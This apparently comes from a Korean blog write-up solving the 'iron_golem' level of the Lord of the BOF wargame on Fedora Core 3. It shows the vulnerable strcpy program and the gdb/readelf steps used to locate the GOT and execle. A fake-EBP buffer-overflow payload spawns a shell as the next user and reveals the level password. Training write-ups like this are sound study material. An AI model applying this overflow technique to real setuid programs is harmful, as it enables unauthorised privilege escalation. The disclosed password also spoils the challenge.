# FC3 - iron_golem

```c
/*
	The Lord of the BOF : The Fellowship of the BOF 
	- iron_golem
	- Local BOF on Fedora Core 3 
	- hint : fake ebp
*/
 
int main(int argc, char *argv[])
{
    char buffer[256];

    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }

    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

Iron golem 문제는 인자를 받아서 buffer에 복사한 뒤에 출력해주는 코드가 들어가 있다. 

문제를 풀기 위해서는 어떤 조건이 걸려있는지 알아야하는데 귀찮게 구하지 않아도 되게 LOB의 모든 FC3 문제는 같은 보호기법이 걸려있음을 알고 시작한다. 다음은 걸려있는 보호기법이다.

- stack dummy
- down privileage of bash
- random stack
- ascii armor
- non-executable stack
- non-executable heap



ASLR이 걸려있으므로 주소가 변하지 않는 bss나 got같은 부분을 이용해야한다. 

많이 사용하는 got과 execle함수를 이용해서 fake ebp기법을 쓴다.

먼저 got와 execle함수의 주소를 찾는다. 

```bash
[gate@Fedora_1stFloor ~]$ gdb -q iron_golem
(no debugging symbols found)...Using host libthread_db library "/lib/tls/libthread_db.so.1".
(gdb) b*main
Breakpoint 1 at 0x80483d0
(gdb) r
Starting program: /home/gate/iron_golem 
(no debugging symbols found)...(no debugging symbols found)...
Breakpoint 1, 0x080483d0 in main ()
(gdb) shell readelf -a iron_golem | grep 'got'
  [20] .got              PROGBITS        08049614 000614 000004 04  WA  0   0  4
  [21] .got.plt          PROGBITS        08049618 000618 00001c 04  WA  0   0  4
   03     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss 
(gdb) x/a 0x08049614
0x8049614 <_DYNAMIC+200>:	0x0
(gdb) 
0x8049618 <_GLOBAL_OFFSET_TABLE_>:	0x804954c <_DYNAMIC>
(gdb) x/a 0x804954c
0x804954c <_DYNAMIC>:	0x1
(gdb) p execle
$1 = {<text variable, no debug info>} 0x7a5610 <execle>
```

gdb를 이용해 got의 위치를 구해보면 0x08049614의 위치에 0x0804954c이라는 주소가 있고 거기에는 0x01이라는 값이 들어있다. 이 값을 이름으로 하는 파일을 하나 만들고 sfp를 got으로 ret을 execle의 주소로 덮어주면 ebp의 주소가 바뀌어서 execle("0x01");이 실행된다.

```sh
[gate@Fedora_1stFloor ~]$ ./iron_golem `python -c 'print "a"*264+"\x10\x96\x04\x08"+"\x23\x57\x7a\x00"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa#Wz
sh-3.00$ ls
ls: .: Permission denied
sh-3.00$ id
uid=501(iron_golem) gid=500(gate) groups=500(gate) context=user_u:system_r:unconfined_t
sh-3.00$ my-pass
euid = 501
blood on the fedora
```

iron_golem의 pw는 'blood on the fedora'이다.